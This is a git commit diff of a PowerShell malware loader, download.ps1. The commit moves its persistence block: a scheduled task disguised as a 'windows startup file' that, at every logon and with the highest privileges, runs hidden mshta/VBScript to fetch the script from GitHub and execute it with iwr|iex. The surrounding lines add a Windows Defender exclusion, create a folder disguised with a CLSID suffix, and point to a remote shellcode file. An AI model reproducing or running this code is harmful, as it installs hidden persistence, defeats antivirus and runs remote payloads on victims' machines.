88b928a342dcbb84585fdce059ce600e9696c884
43a1723 <hai1723notgay@gmail.com>
2024-08-08 19:49:52 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -30,6 +30,14 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     }
 }
 
+$task_name = "Wkrean"
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
+$task_trigger = New-ScheduledTaskTrigger -AtLogOn
+$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
+Write-Host "[!] Persistence Added" -ForegroundColor Green
+
+Remove-Item -Path "$startupfolder\download.bat" -Force
 
 $rdir = "C:\Users\Loader"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
@@ -40,13 +48,6 @@ $temp = "$dir\temp"
 New-Item -ItemType Directory -Path $temp
 
 Add-MpPreference -ExclusionPath $dir
-
-$task_name = "Wkrean"
-$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
-$task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
-Write-Host "[!] Persistence Added" -ForegroundColor Green
 
 
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
